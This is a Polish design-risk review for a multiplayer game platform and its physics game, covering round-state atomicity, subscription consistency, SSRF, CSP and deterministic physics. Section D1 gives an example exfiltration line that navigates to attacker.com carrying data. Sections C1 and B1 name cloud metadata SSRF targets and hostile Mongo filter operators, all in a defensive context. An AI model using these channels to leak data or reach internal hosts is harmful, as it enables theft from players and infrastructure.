# sixseven — ryzyka implementacyjne i wytyczne

> Analiza planu (`ARCHITECTURE.md`, `IMPLEMENTATION_PLAN.md`, `games/ARROWSOCCER.md`) pod kątem problemów, które wyjdą dopiero w kodzie. Format: **problem → wytyczna**, z etapem, w którym trzeba to załatwić. Wpisy oznaczone ⚠ wymagają poprawki w istniejących dokumentach (lista na końcu).

## Najpoważniejsze (przeczytaj choćby tylko to)

1. **A1** — restart games po wysłaniu `/resolve` reotwiera planowanie: sprzeczność z cyklem sekretu. Potrzebny trwały stan „zapieczętowana" per runda.
2. **A2** — zapis wyniku rundy (events + matches + views ×N) nie jest atomowy; streamy rozniosą stan częściowy.
3. **F1/F3** — determinizm fizyki arrowsoccera: transcendentalia różnią się między silnikami JS, a preset `flipper` (restytucja > 1) łamie strażnika tunelowania.
4. **D1/D2** — CSP nie zamyka kanałów nawigacyjnych, a subdomena platformy dla bundli dzieli scope cookies. Filar „ranked = bezpieczny UI" wymaga doprojektowania.
5. **B3** — snapshot + change stream bez dyscypliny resume tokena gubi zdarzenia; to fundament wszystkich subskrypcji.

## A. Sekret i cykl życia rundy

### A1. Restart games po wysłaniu `/resolve` ⚠
**Problem:** Plan mówi „nierozstrzygnięta runda restartuje fazę Planning z pełnym czasem". Jeśli crash nastąpił **po** wysłaniu `/resolve` (stan 4 cyklu sekretu), ruchy już opuściły platformę. Reotwarcie planowania: (a) gracze mogą zmienić ruchy, które serwis gry już zna — dev dostaje przewagę informacyjną wobec własnej logiki, (b) `resolve_log` ma wpis dla rundy, która potem wygląda inaczej — fałszywe pozytywy replay-auditu.
**Wytyczna:** zapieczętowanie fazy (stan 3) to **trwałe, atomowe przejście zapisywane przed wywołaniem `/resolve`** (flaga/subfaza `sealed` per runda w `match_states`). Rehydracja: runda `sealed` → ponowny `/resolve` z tymi samymi zapieczętowanymi ruchami (bezpieczne — determinizm); tylko runda niezapieczętowana restartuje Planning. *(etap 2)*

### A2. Zapis wyniku rundy nie jest atomowy
**Problem:** Po `/resolve` silnik pisze `match_events` + `matches` + `match_views` ×N. Bez transakcji change streamy rozniosą stan częściowy (klient widzi nową fazę bez nowego widoku albo odwrotnie); crash w połowie zostawia mecz niespójny.
**Wytyczna:** transakcja multi-dokumentowa (replica set ją wspiera; change streams emitują dopiero po commicie — spójny fan-out za darmo). Fallback, gdyby transakcje bolały wydajnościowo: ścisła kolejność zapisu z `matches` (zmianą fazy) jako ostatnim „commit markerem" + numer rundy w każdym dokumencie, klient renderuje po komplecie. Rekomendacja: transakcja — prostsza do udowodnienia. *(etap 2)*

### A3. Nadpisanie ruchu nie może dotykać kolekcji subskrybowalnych ⚠
**Problem:** I3 pilnuje timingu pierwszego acku, ale każda modyfikacja dokumentu `matches` przy nadpisaniu ruchu (I4) to obserwowalne zdarzenie — „przeciwnik zmienia zdanie N razy" jest informacją.
**Wytyczna:** nadpisanie pisze wyłącznie do prywatnej `moves`; `ready` ustawiane raz i nigdy nie dotykane ponownie w rundzie. Rozszerzyć test S2: nadpisania nie generują żadnych zdarzeń w kolekcjach subskrybowalnych. *(etap 2)*

### A4. Retry `/resolve`: idempotencja i podpisy
**Problem:** Timeout ≠ niedoręczone — serwis mógł żądanie przetworzyć. Poza tym backoff 2/4/8 s wychodzi poza okno HMAC ±30 s tylko przy pechu, ale podpisu i tak nie wolno reużyć.
**Wytyczna:** każda próba ma świeży podpis (nowy timestamp), to samo `(matchId, round)` jako klucz idempotencji w żądaniu; `resolve_log` zapisuje wszystkie próby i oznacza tę użytą. Determinizm czyni retry bezpiecznym — ale tylko dlatego trzeba go pilnować kontrakt-testami. *(etap 2)*

### A5. Timery nie mogą żyć w `setTimeout`
**Problem:** Timer per mecz w pamięci procesu nie przeżywa restartu, a przy tysiącach meczów jest nieprzewidywalny.
**Wytyczna:** deadline'y wyłącznie w dokumentach (`matches.deadline`, indeks) + jedna pętla harmonogramu skanująca przeterminowane; przejścia faz idempotentne (warunkowy update: „zamknij fazę tylko jeśli nadal `planning` i `round == N`"). To samo załatwia rehydrację po restarcie i przyszłe wiele instancji games. *(etap 2)*

## B. Subskrypcje i gate

### B1. Filtr klienta to wektor ataku
**Problem:** Filtr klienta jest AND-owany z serwerowym, ale sam w sobie to zapytanie Mongo od niezaufanej strony: `$where`, `$expr`, regexy katastroficzne (ReDoS), głębokie zagnieżdżenia.
**Wytyczna:** whitelist operatorów (`$eq`, `$in`, `$gt/$lt` na jawnie dozwolonych polach), limit głębokości i rozmiaru filtra, walidacja w silniku subskrypcji (nie konwencją per handler). Test S1 rozszerzyć o filtry-ataki. *(etap 1)*

### B2. Sanityzacja pól ma dwie ścieżki — musi mieć jeden kod
**Problem:** Dane płyną do klienta dwiema drogami: snapshot (`collection-init`, zapytanie) i delta (change stream, `fullDocument`). Sanityzacja pól (np. `games` bez urls/sekretów, cudzy profil okrojony) zaimplementowana w jednej ścieżce a zapomniana w drugiej = wyciek.
**Wytyczna:** polityka per kolekcja definiuje **jeden** sanitizer, wołany w obu ścieżkach; update events z `fullDocument: 'updateLookup'`. S1 ćwiczy obie drogi: snapshot i delta po zmianie dokumentu. *(etap 1)*

### B3. Luka między snapshotem a streamem
**Problem:** Sekwencja „snapshot, potem otwórz stream" gubi zdarzenia z przerwy; odwrotna bez bufora dubluje lub aplikuje delty na starszy snapshot. Klient zostaje z martwym stanem, którego nic nie naprawi do resubscribe.
**Wytyczna:** otwórz stream (zapamiętaj resume token) → zrób snapshot → dosyłaj zbuforowane delty nowsze niż snapshot. Delty idempotentne (upsert po `_id`). Ten wzorzec wchodzi do silnika subskrypcji i do `useCollection` jednocześnie; test integracyjny z pisaniem w trakcie subscribe. *(etap 1)*

### B4. Wolumen streamów rośnie kwadratowo z aktywnością
**Problem:** Każda runda = 1 insert + 1 update + N updates `match_views`; gate dopasowuje każde zdarzenie do wszystkich subskrypcji in-process. Przy setkach meczów to zauważalne CPU zanim pojawi się matchmaking.
**Wytyczna:** `$match` po kolekcji w pipeline change streamu (odsiew po stronie Mongo), indeks subskrypcji `kolekcja → tickets` (nie iteracja po wszystkich), benchmark jako kryterium akceptacji etapu 2 (np. 200 równoległych meczów RPS na dev-maszynie bez zadyszki). *(etap 2, pomiar przed etapem 3)*

## C. Zdalne serwisy gier

### C1. SSRF przez URL-e rejestracji
**Problem:** Dev rejestruje dowolny URL — w tym `localhost`, adresy prywatne, metadata endpoint chmury (`169.254.169.254`), albo domenę, która po walidacji zaczyna resolvować na IP wewnętrzne (DNS rebinding). Silnik woła te URL-e z wnętrza infrastruktury.
**Wytyczna:** walidacja przy rejestracji **i przy każdym wywołaniu**: resolve DNS → odrzuć zakresy prywatne/link-local → przypnij wynikowe IP na czas żądania. Zakaz podążania za redirectami. Limit rozmiaru odpowiedzi egzekwowany strumieniowo (nie po wczytaniu). Docelowo osobny egress dla ruchu do devów. *(etap 2)*

### C2. „Budżet 2 s" wymaga definicji
**Problem:** 2 s liczone od czego? TLS handshake, time-to-first-byte i czytanie body to różne zegary; bez definicji każdy timeout będzie zaimplementowany inaczej.
**Wytyczna:** zdefiniować w wire contract: connect timeout / całkowity budżet od wysłania do odczytania pełnego body / max rozmiar body. Keep-alive pool per serwis gry (handshake nie zjada budżetu każdej rundy). Telemetria czasów od pierwszego dnia RPS — to dane do kalibracji z `UNKNOWNS.md`. *(etap 2)*

### C3. Wersja logiki w żądaniu ⚠
**Problem:** Dev ma obowiązek przyjąć stan ze starszej wersji logiki, ale żądanie nie mówi mu, z jaką wersją manifestu mecz wystartował. Po stronie judge: legalna zmiana wersji sprawia, że replay historycznego żądania **ma prawo** dać inny wynik — bez logu wersji replay-audit generuje fałszywe pozytywy.
**Wytyczna:** każde żądanie `/resolve` niesie wersję manifestu meczu; `resolve_log` ją zapisuje; werdykt „replay niezgodny" wymaga zgodności wersji między oryginałem a powtórką. *(etap 2 wire contract, etap 5 judge)*

## D. UI bundle i CSP (ranked)

### D1. CSP nie zamyka wszystkich kanałów eksfiltracji ⚠
**Problem:** `connect-src` blokuje fetch/WS/beacon, ale **nie blokuje nawigacji**: `location = attacker.com/?d=...`, `form-action`, `<a ping>`, prefetch, `window.open`. Test S3 w obecnym brzmieniu (fetch, WS, WebRTC, obrazek) tego nie łapie.
**Wytyczna:** pełna polityka od `default-src 'none'` z jawnymi zezwoleniami + `form-action 'none'` + kontrola rejestracji service workerów; rozważyć bundle w sandboxowanym iframe. Rozszerzyć S3 o kanały nawigacyjne i ping. Rezydualne ryzyko (kanałów nawigacyjnych nie da się zamknąć w 100% bez zabicia UX) zapisać wprost w ADR — warstwa 3 (detekcja) pozostaje siatką. *(etap 4)*

### D2. Osobna domena rejestrowalna dla bundli
**Problem:** „Subdomena per gra" pod domeną platformy dzieli z nią scope cookies (cookie z `Domain=.sixseven.gg` czytelne w bundlu) i sąsiaduje w polityce origin — jedna literówka w konfiguracji cookies = sesje graczy w rękach kodu gry.
**Wytyczna:** bundle serwowane z **osobnej domeny rejestrowalnej** (wzorzec `googleusercontent.com`), np. `sixsevenusercontent.com`, subdomena per gra tam; cookies platformy host-only. Decyzja tania teraz, kosztowna po fakcie (zmiana originów łamie tokeny i CSP wszystkich gier). *(decyzja w etapie 4, zanim powstanie pierwszy bundle)*

## E. Zaufanie i judge

### E1. Agregaty muszą być czystą funkcją zdarzeń
**Problem:** Renoma/sprawdzalność aktualizowane przyrostowo na dokumencie gry dryfują (bug, migracja, ręczna korekta) i nie da się ich zaudytować.
**Wytyczna:** `trust_events` to jedyne źródło prawdy; agregaty w 100% odtwarzalne jobem recompute (uruchamianym też okresowo jako self-check). Zmiana formuł/wag = przeliczenie historii wg nowych parametrów, świadomie i jawnie. *(etap 5)*

### E2. `resolve_log` rośnie bez granic
**Problem:** Wejście/wyjście każdego `/resolve` = stan × rundy × mecze. Dla arrowsoccera stan zawiera 9 ciał i formacje — megabajty dziennie na grę przy umiarkowanym ruchu.
**Wytyczna:** polityka retencji od pierwszego dnia: pełny log przez X dni (okno audytu), potem próbka losowa + wszystkie wpisy powiązane z otwartymi `audit_cases`; kompresja wpisów. Parametry w konfigu. *(etap 2 — bo log powstaje w etapie 2, nie 5)*

## F. arrowsoccer — determinizm fizyki

### F1. Transcendentalia są niedeterministyczne między silnikami JS ⚠
**Problem:** `+ − × ÷` i `sqrt` są ścisłe wg IEEE 754 — identyczne wszędzie. `Math.sin/cos/atan2/pow/hypot` **nie są**: różnią się między V8, JSC i SpiderMonkey. Serwis logiki (Node) i telefony graczy (Safari!) policzą inną trajektorię — „ta sama symulacja lokalnie" się rozjedzie.
**Wytyczna:** `@sixseven/sdk/math` ogranicza się do operacji ścisłych. W symulacji arrowsoccera trygonometria jest zbędna — strzałki to wektory, nie kąty; odbicia i kolizje kół potrzebują tylko iloczynów, różnic i `sqrt`. Lint w SDK zakazujący `Math.*` w module fizyki. Prezentacja (siatka-cloth, kamera) może używać czego chce — nie wpływa na stan. *(etap 6, decyzja o zakresie sdk/math w etapie 2)*

### F2. Kolejność iteracji jest częścią determinizmu
**Problem:** Pętla kolizji „w stałej kolejności ciał" oparta o kolejność kluczy obiektu JS jest krucha: klucze integer-like są porządkowane numerycznie przed stringami, a stan przechodzi serializację JSON przez platformę.
**Wytyczna:** iteracja zawsze po jawnie posortowanej liście ID (sort w module fizyki, nie założenie o wejściu). Test: `resolve(state)` i `resolve(JSON.parse(JSON.stringify(state)))` dają bajt w bajt ten sam wynik. *(etap 6)*

### F3. Flipper (restytucja > 1) łamie strażnika tunelowania ⚠
**Problem:** Strażnik `vMax · Δt < min(r)` zakłada ograniczoną prędkość, ale restytucja > 1 pompuje energię przy każdym odbiciu — prędkość rośnie bez granic → tunelowanie wraca, a symulacja może nigdy nie zejść pod próg energii.
**Wytyczna:** twardy clamp prędkości `vMax` jako **niezmiennik kwantu** (ta sama ranga co „nic nie opuszcza boiska"), nie tylko limit siły strzałki. Wtedy strażnik tunelowania liczy się od `vMax`, a limit kwantów domyka terminację. Zakresy suwaka restytucji projektować łącznie z `vMax` i `Δt`. *(etap 6, do dopisania w ARROWSOCCER.md już teraz)*

### F4. Rozjazd wersji modułu fizyki logika ↔ bundle
**Problem:** Wspólny moduł żyje w dwóch artefaktach deployowanych osobno (serwis logiki, bundle UI). Skew wersji = animacja rozjeżdża się z autorytatywnym stanem — cichy, podważający zaufanie graczy bug.
**Wytyczna:** wersja modułu fizyki w stanie meczu; UI po odtworzeniu porównuje pozycje końcowe z autorytatywnym stanem (checksum w `events`) — rozjazd → snap do stanu autorytatywnego + telemetria. Rozjazd ma być głośny w metrykach, niewidoczny dla gracza. *(etap 6)*

### F5. Klamp formacji musi być zdefiniowanym algorytmem
**Problem:** „Klamp do najbliższej legalnej pozycji" przy nakładających się zawodnikach zależy od kolejności klampowania — dwa poprawne kody dadzą różne wyniki, a wynik wchodzi do deterministycznego stanu.
**Wytyczna:** zdefiniować algorytm w spec (np.: sortuj po UnitId → projekcja na obszar legalny → iteracyjna separacja par z limitem iteracji → fallback na pozycje domyślne), property-testy: wynik zawsze legalny, deterministyczny, stabilny dla legalnego wejścia. *(etap 6)*

### F6. Transformacja widok → świat (obrót 0/180°)
**Problem:** Strzałki rysowane w przestrzeni widoku, formacje w kanonicznej, stan w świecie — trzy układy i lustro. Klasyczne źródło bugów „moje strzałki działają, ale gram od góry".
**Wytyczna:** jedna funkcja transformacji w module współdzielonym, używana przez rysowanie strzałek, edytor formacji i render; testy roundtrip (widok→świat→widok = identyczność) dla obu stron. Zero transformacji pisanych ad hoc w komponentach. *(etap 6)*

### F7. Krawędzie gola zdefiniować przed kodem
**Problem:** Gol wykrywany na granicy kwantu: przecięcie linii dokładnie w kwancie kolizji z klampem, teoretyczny podwójny gol po odbiciu — niedodefiniowane reguły to spory graczy nie do rozstrzygnięcia po fakcie.
**Wytyczna:** spec: pierwsze przecięcie linii bramkowej środkiem piłki (sprawdzane po odbiciach i klampie danego kwantu) kończy symulację w tym kwancie; samobój = punkt dla przeciwnika; kolejność sprawdzania bramek deterministyczna. Testy przypadków granicznych zanim powstanie UI. *(etap 6)*

## G. Proces

### G1. Etap 2 to największe ryzyko harmonogramu
**Problem:** Silnik + maszyna stanów + SDK + wire contract + harness + RPS serwis + RPS UI + handoff/tokeny + pokój przez link + ekran wyniku — to połowa platformy w jednym etapie z jednym kryterium końcowym.
**Wytyczna:** pokroić na wewnętrzne milestone'y z własnymi testami: (a) maszyna stanów + kolekcje prywatne + pętla timerów z serwisem-fake po HTTP na localhost, (b) `sdk serve` + harness kontrakt-testów, (c) RPS end-to-end bez handoffu (pełny JWT), (d) handoff + tokeny meczu. Kryterium „dwóch ludzi z telefonów" zostaje bramką końcową. *(etap 2)*

### G2. Kalibracja wymaga telemetrii od etapu 2
**Problem:** Wszystkie liczby są w konfigu do kalibracji, ale bez pomiarów etap 5 kalibruje w ciemno.
**Wytyczna:** od pierwszego meczu RPS logować: czasy `/resolve` (percentyle), długości faz, częstość timeoutów i defaultMove, rozmiary stanów. Tani licznik teraz, dane do wszystkich tabel z `IMPLEMENTATION_PLAN.md` później. *(etap 2)*

## Poprawki do naniesienia w istniejących dokumentach

Wszystkie naniesione (prerekwizyty Etapu 2). Dodatkowo A2 (atomowy zapis wyniku rundy) i A4 (świeży podpis + klucz idempotencji przy retry) dopisane przy okazji do maszyny stanów / wire contract.

| Dokument | Zmiana | Wpis | Status |
|---|---|---|---|
| `IMPLEMENTATION_PLAN.md` | maszyna stanów: subfaza `sealed` per runda; rehydracja: sealed → ponowny `/resolve`, nie restart Planning | A1 | ✓ naniesione |
| `IMPLEMENTATION_PLAN.md` | maszyna stanów: atomowy (transakcyjny) zapis wyniku rundy | A2 | ✓ naniesione |
| `IMPLEMENTATION_PLAN.md` | test S2: nadpisania ruchu nie generują zdarzeń w kolekcjach subskrybowalnych | A3 | ✓ naniesione |
| `IMPLEMENTATION_PLAN.md` | test S3: + nawigacja, form-action, `<a ping>`, prefetch | D1 | ✓ naniesione |
| `ARCHITECTURE.md` / wire contract | wersja manifestu w żądaniu `/resolve`; werdykt replay wymaga zgodności wersji | C3 | ✓ naniesione |
| `games/ARROWSOCCER.md` | clamp prędkości `vMax` jako niezmiennik kwantu; zakres restytucji wiązany z `vMax·Δt` | F3 | ✓ naniesione |
| `games/ARROWSOCCER.md` | zakaz transcendentaliów w module fizyki (strzałki jako wektory, bez kątów) | F1 | ✓ naniesione |
